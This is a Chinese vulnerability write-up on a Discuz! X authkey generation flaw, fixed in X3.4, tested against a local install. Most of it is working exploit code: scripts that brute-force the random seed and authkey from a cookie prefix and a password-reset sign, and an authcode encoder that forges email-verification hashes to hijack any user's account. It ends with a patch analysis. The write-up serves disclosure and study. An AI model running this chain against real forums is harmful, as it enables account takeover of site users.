---
title: Discuz_X authkey安全性漏洞分析
date: 2017-08-31 10:26:38
tags:
- 漏洞分析
---


2017年8月1日，Discuz!发布了X3.4版本，此次更新中修复了authkey生成算法的安全性漏洞，通过authkey安全性漏洞，我们可以获得authkey。系统中逻辑大量使用authkey以及authcode算法，通过该漏洞可导致一系列安全问题：邮箱校验的hash参数被破解，导致任意用户绑定邮箱可被修改等...
2017年8月22日，360cert团队发布了对该补丁的分析，我们对整个漏洞进行了进一步分析，对漏洞的部分利用方式进行了探究。

<!--more-->

# 漏洞详情 #
    
    2017年8月1日，Discuz!发布了X3.4版本，此次更新中修复了authkey生成算法的安全性漏洞，通过authkey安全性漏洞，我们可以获得authkey。系统中逻辑大量使用authkey以及authcode算法，通过该漏洞可导致一系列安全问题：邮箱校验的hash参数被破解，导致任意用户绑定邮箱可被修改等...
    2017年8月22日，360cert团队发布了对该补丁的分析，我们对整个漏洞进行了进一步分析，对漏洞的部分利用方式进行了探究。

漏洞影响版本：
- Discuz_X3.3_SC_GBK
- Discuz_X3.3_SC_UTF8
- Discuz_X3.3_TC_BIG5
- Discuz_X3.3_TC_UTF8
- Discuz_X3.2_SC_GBK
- Discuz_X3.2_SC_UTF8
- Discuz_X3.2_TC_BIG5
- Discuz_X3.2_TC_UTF8
- Discuz_X2.5_SC_GBK
- Discuz_X2.5_SC_UTF8
- Discuz_X2.5_TC_BIG5
- Discuz_X2.5_TC_UTF8

漏洞在`Discuz_X3.4`中被修复

# 漏洞分析 #

在dz3.3/upload/install/index.php 346行
![image.png-184.7kB][1]

我们看到authkey是由多个参数的md5前6位加上random生成的10位产生的。

跟入random函数
![image.png-115.2kB][2]

当php版本大于4.2.0时，随机数种子不会改变

我们可以看到在生成authkey之后，使用random函数生成了4位cookie前缀
```
$_config['cookie']['cookiepre'] = random(4).'_';
```

那么这4位cookie前缀就是我们可以得到的，那我们就可以使用字符集加上4位已知字符，爆破随机数种子。

首先我们需要先获得4位字符
![image.png-193.7kB][3]

sW7c

然后通过脚本生成用于php_mt_seed的参数
```
# coding=utf-8

w_len = 10
result = ""
str_list = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"
length = len(str_list)

for i in xrange(w_len):
	result+="0 "
	result+=str(length-1)
	result+=" "
	result+="0 "
	result+=str(length-1)
	result+=" "

sstr = "sW7c"

for i in sstr:
	result+=str(str_list.index(i))
	result+=" "
	result+=str(str_list.index(i))
	result+=" "
	result+="0 "
	result+=str(length-1)
	result+=" "

print result
```
得到参数,使用php_mt_seed脚本
```
./php_mt_seed 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 54 54 0 61 22 22 0 61 33 33 0 61 38 38 0 61 > result.txt
```

这里我获得了245组种子

接下来我们需要使用这245组随机数种子生成随机字符串
```
<?php


function random($length) {
	$hash = '';
	$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
	$max = strlen($chars) - 1;
	PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
	for($i = 0; $i < $length; $i++) {
		$hash .= $chars[mt_rand(0, $max)];
	}
	return $hash;
}

$fp = fopen('result.txt', 'rb');
$fp2 = fopen('result2.txt', 'wb');

while(!feof($fp)){
	$b = fgets($fp, 4096);
	if(preg_match("/seed = (\d)+/", $b, $matach)){
		$m = $matach[0];
	}else{
		continue;
	}
	// var_dump(substr($m,7));
	mt_srand(substr($m,7));
	fwrite($fp2, random(10)."\n");
}
fclose($fp);
fclose($fp2);
```

当我们获得了所有的后缀时，我们需要配合爆破6位字符（0-9a-f）来验证authkey的正确性,由于的数量差不多16**6*200+,为了在有限的时间内爆破出来，我们需要使用一个本地爆破的方式。

这里使用了找回密码中的id和sign参数，让我们一起来看看逻辑。

当我们点击忘记密码的时候。

会进入`/source/module/member/member_lostpasswd.php` 65行生成用于验证的sign值。

![image.png-109.2kB][4]

跟随make_getpws_sign函数进入`/source/function/function_member.php`
![image.png-61.1kB][5]

然后进入dsign函数，配合authkey生成结果
![image.png-50.8kB][6]

这里我们可以用python模拟这个过程，然后通过找回密码获得uid、id、sign，爆破判断结果。

脚本如下
```
# coding=utf-8

import itertools
import hashlib
import time

def dsign(authkey):
	url = "http://127.0.0.1/dz3.3/"
	idstring = "vnY6nW"
	uid = 2
	uurl = "{}member.php?mod=getpasswd&uid={}&id={}".format(url, uid, idstring)

	url_md5 = hashlib.md5(uurl+authkey)
	return url_md5.hexdigest()[:16]


def main():
	sign = "af3b937d0132a06b"

	str_list = "0123456789abcdef"

	with open('result2.txt') as f:
		ranlist = [s[:-1] for s in f]

	s_list = sorted(set(ranlist), key=ranlist.index)

	r_list = itertools.product(str_list, repeat=6)

	print "[!] start running...."
	s_time = time.time()

	for j in r_list:
		for s in s_list:
			prefix = "".join(j)
			authkey = prefix + s
			# print dsign(authkey)
			if dsign(authkey) == sign:
				print "[*] found used time: " + str(time.time() - s_time)
				return "[*] authkey found: " + authkey

print main()
```

差不多1小时左右就能得到结果。

![image.png-46.3kB][7]
![image.png-107.4kB][8]

返回结果一致，成功得到authkey。

那么问题来了，通过获得authkey，我们能干什么，这里举一个修改任意用户邮箱的例子，通过修改邮箱，我们可以使用忘记密码功能来重置任意用户的密码。

当我们申请修改邮箱的时候，我们会受到一封类似于下面这样的邮件。
![image.png-61.4kB][9]

验证链接类似于
```
http://127.0.0.1/dz3.3/home.php?mod=misc&ac=emailcheck&hash=0eb7yY2wtS1q16Zs2%2BtSkR6w5O%2Fx6jdLbu0FnWbegB8ixs2Y6tfcyAnrvz4yPIE7pKzoqawU0ku47y4F
```

跟入`/source/include/misc/misc_emailcheck.php` 代码如下：
```
<?php

/**
 *      [Discuz!] (C)2001-2099 Comsenz Inc.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: misc_emailcheck.php 33688 2013-08-02 03:00:15Z nemohou $
 */

if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}

$uid = 0;
$email = '';
$_GET['hash'] = empty($_GET['hash']) ? '' : $_GET['hash'];
if($_GET['hash']) {
	list($uid, $email, $time) = explode("\t", authcode($_GET['hash'], 'DECODE', md5(substr(md5($_G['config']['security']['authkey']), 0, 16))));
	$uid = intval($uid);
}
// exit($email);
if($uid && isemail($email) && $time > TIMESTAMP - 86400) {

	$member = getuserbyuid($uid);
	$setarr = array('email'=>$email, 'emailstatus'=>'1');
	if($_G['member']['freeze'] == 2) {
		$setarr['freeze'] = 0;
	}
	loaducenter();
	$ucresult = uc_user_edit(addslashes($member['username']), '', '', $email, 1);

	if($ucresult == -8) {
		showmessage('email_check_account_invalid', '', array(), array('return' => true));
	} elseif($ucresult == -4) {
		showmessage('profile_email_illegal', '', array(), array('return' => true));
	} elseif($ucresult == -5) {
		showmessage('profile_email_domain_illegal', '', array(), array('return' => true));
	} elseif($ucresult == -6) {
		showmessage('profile_email_duplicate', '', array(), array('return' => true));
	}
	if($_G['setting']['regverify'] == 1 && $member['groupid'] == 8) {
		$membergroup = C::t('common_usergroup')->fetch_by_credits($member['credits']);
		$setarr['groupid'] = $membergroup['groupid'];
	}
	updatecreditbyaction('realemail', $uid);
	C::t('common_member')->update($uid, $setarr);
	C::t('common_member_validate')->delete($uid);
	dsetcookie('newemail', "", -1);

	showmessage('email_check_sucess', 'home.php?mod=spacecp&ac=profile&op=password', array('email' => $email));
} else {
	showmessage('email_check_error', 'index.php');
}

?>
```

当hash传入的时候，服务端会调用authcode函数解码获得用户的uid，要修改成的email，时间戳。
```
list($uid, $email, $time) = explode("\t", authcode($_GET['hash'], 'DECODE', md5(substr(md5($_G['config']['security']['authkey']), 0, 16))));
```

然后经过一次判断
```
if($uid && isemail($email) && $time > TIMESTAMP - 86400) {
```

这里没有任何额外的判断，在接下来的部分，也仅仅对uid的有效性做了判断，而uid代表这用户的id值，是从1开始自增的。

也就是说，只要authcode函数解开hash值，就能成功的验证并修改邮箱。

这里我们可以直接使用authcode函数来获得hash值

```
<?php
        //Enter your code here, enjoy!

function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {

	$ckey_length = 4;

	$key = md5($key ? $key : UC_KEY);
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

	$cryptkey = $keya.md5($keya.$keyc);
	$key_length = strlen($cryptkey);

	$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
	$string_length = strlen($string);

	$result = '';
	$box = range(0, 255);

	$rndkey = array();
	for($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}

	for($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}

	for($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
	}

	if($operation == 'DECODE') {
		if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
			return substr($result, 26);
		} else {
			return '';
		}
	} else {
		return $keyc.str_replace('=', '', base64_encode($result));
	}

}

echo authcode("3\ttest@success.com\t1503556905", 'ENCODE', md5(substr(md5("5e684ceqNxuCvmoK"), 0, 16)));
```

访问hash页面，我们可以看到验证邮箱已经被修改了，接下来我们可以直接通过忘记密码来修改当前用户的密码。
![image.png-52kB][10]

# 漏洞复现 #

打开页面
![image.png-193.7kB][11]

获取cookie随机数4位前缀：sW7c

生成php_mt_seed参数格式：0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 54 54 0 61 22 22 0 61 33 33 0 61 38 38 0 61

使用php_mt_seed爆破seed：
```
./php_mt_seed 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 54 54 0 61 22 22 0 61 33 33 0 61 38 38 0 61 > result.txt
```

点击忘记密码，得到找回链接：
```
http://127.0.0.1/dz3.3/member?mod=getpasswd&uid=2&id=vnY6nW&sign=af3b937d0132a06b
```

通过sign、id、uid来爆破authkey。
![image.png-313.1kB][12]

跑到authkey
![image.png-46.3kB][13]

我们可以构造邮箱验证的hash值来修改用户绑定邮箱，进一步导致任意用户密码可被修改。

通过脚本构造hash值

![image.png-32.9kB][14]

构造验证邮箱链接

![image.png-64.4kB][15]

直接访问即可发现验证成功，找回密码就会向已验证邮箱发送重置密码邮件。

# 补丁分析 #

在正式版3.4中，Discuz_X正式修复了这个漏洞。

![image.png-48.5kB][16]

```
 
-		$authkey = substr(md5($_SERVER['SERVER_ADDR'].$_SERVER['HTTP_USER_AGENT'].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, 0, 6)), 8, 6).random(10);
 	346
+		$authkey = md5($_SERVER['SERVER_ADDR'].$_SERVER['HTTP_USER_AGENT'].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, 0, 8)).random(18);
```

修复方式比较粗暴，将不可被获知的部分加长到32位，random位数加到18位，基本上爆破的代价非常之大，可以被认为不可获得。

# 结语 #

    根据上面的分析，我们可以发现整个authkey安全性漏洞的利用思路非常精巧，获取到authkey之后，对dz的前台用户影响巨大，包括前台的cookie，多个点的验证hash中都有authkey的身影，但是由于dz对多个部分的验证都加入了随机数等多种二次验证方式，很大程度上防止了由于authkey泄露会导致的一些问题，所以漏洞本身的危害又有限，如果想要进一步利用可能还需要配合别的漏洞进行。

# 来源 #

- [Discuz!官网](http://www.discuz.net)
- [Discuz!更新X3.4](http://www.discuz.net/thread-3825961-1-1.html)
- [Seebug收录](https://www.seebug.org/vuldb/ssvid-96371)
- [php_mt_seed](http://www.openwall.com/php_mt_seed/README)
- [Discuz!更新比较](https://git.oschina.net/ComsenzDiscuz/DiscuzX/commit/bb600b8dd67a118f15255d24e6e89bd94a9bca8a)
- [360cert分析](http://bobao.360.cn/learning/detail/4302.html)



  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/27by3pv6j16qauhgebbrapvr/image.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/vd44ejapmbdfwnq8z8vklxb1/image.png
  [3]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/4q78iyn4bndzmtarrcrk43wn/image.png
  [4]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/737c9gqg6cdtlo4aryxpnxwe/image.png
  [5]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/fu70qeqhk55gw55xm0qwkbk2/image.png
  [6]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/fdmabv7avbqd1w5libd3j0g3/image.png
  [7]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/cipp76y0aw4wz33z3c7ambth/image.png
  [8]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/fmwrfzfbm4jjrv1nsm8e92r0/image.png
  [9]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/n882uz5x3qrymr6ljsb89brm/image.png
  [10]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/dgu0bdnhje2u2caxy0q5bmgs/image.png
  [11]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/4q78iyn4bndzmtarrcrk43wn/image.png
  [12]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/ivok9agi1lurxhe4xkst4vyj/image.png
  [13]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/cipp76y0aw4wz33z3c7ambth/image.png
  [14]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/jeddzeumksc2zm7ioph0ybk3/image.png
  [15]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/g0fipnw0vrrsojjmnfsc9mtg/image.png
  [16]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/vl37a7f8giy88mbhndxkbb9x/image.png